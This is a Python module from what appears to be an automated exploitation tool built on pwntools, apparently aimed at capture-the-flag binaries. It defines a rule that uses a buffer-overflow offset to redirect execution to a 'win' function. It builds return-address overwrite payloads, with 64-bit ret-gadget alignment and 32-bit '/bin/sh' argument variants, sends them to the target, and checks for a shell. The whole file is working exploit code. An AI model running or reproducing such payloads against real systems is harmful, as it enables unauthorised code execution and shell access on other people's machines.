"""Rule: use expanded win function detection (functions that call system internally)."""
from __future__ import annotations

from pwn import log, flat, p64, p32

from autopwn.agent.state import ActionResult, AttemptRecord
from autopwn.agent.action_utils import open_target, verify_shell, interactive_or_close, safe_close


def _condition(state) -> bool:
    if not state.discovered_facts.get("expanded_win"):
        return False
    # Only if we have overflow capability
    return state.ctx.overflow_offset > 0


def _action(state) -> ActionResult:
    """Call the expanded win function via overflow."""
    ctx = state.ctx
    info = state.discovered_facts["expanded_win"]
    win_name = info["name"]
    win_addr = info["addr"]
    offset = ctx.overflow_offset
    word = ctx.bits // 8
    pack = p64 if word == 8 else p32
    ret_gadget = ctx.find_gadget("ret")

    log.info(f"Agent expanded_win: calling {win_name}@{win_addr:#x}")

    # Try different payload variants
    variants = []
    if ctx.bits == 64:
        if ret_gadget:
            variants.append(("align+call", b"A" * offset + pack(ret_gadget) + pack(win_addr)))
        variants.append(("direct", b"A" * offset + pack(win_addr)))
    else:
        variants.append(("direct", b"A" * offset + pack(win_addr)))
        # 32-bit may need argument: try with "/bin/sh" addr or dummy
        if ctx.elf:
            try:
                sh_addr = next(ctx.elf.search(b"/bin/sh\x00"))
                variants.append(("with_arg", b"A" * offset + pack(win_addr) + pack(0xDEADBEEF) + pack(sh_addr)))
            except StopIteration:
                # Try "sh" string
                try:
                    sh_addr = next(ctx.elf.search(b"sh\x00"))
                    variants.append(("with_sh", b"A" * offset + pack(win_addr) + pack(0xDEADBEEF) + pack(sh_addr)))
                except StopIteration:
                    pass

    for name, payload in variants:
        io = None
        try:
            io = open_target(ctx)
            try:
                io.recv(timeout=1)
            except Exception:
                pass

            if ctx.input_type in ("gets", "direct"):
                io.sendline(payload)
            else:
                io.send(payload)

            if verify_shell(io):
                log.success(f"Agent expanded_win: {win_name} worked ({name})")
                return ActionResult(
                    success=interactive_or_close(io, True),
                    record=AttemptRecord(strategy="expanded_win", success=True),
                )
            safe_close(io)
        except Exception:
            if io:
                safe_close(io)

    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="expanded_win", diagnosis="all_variants_failed"),
    )


RULES = [
    ("expanded_win", 88, "call non-standard win function (GetFlag etc)",
     _condition, _action),
]
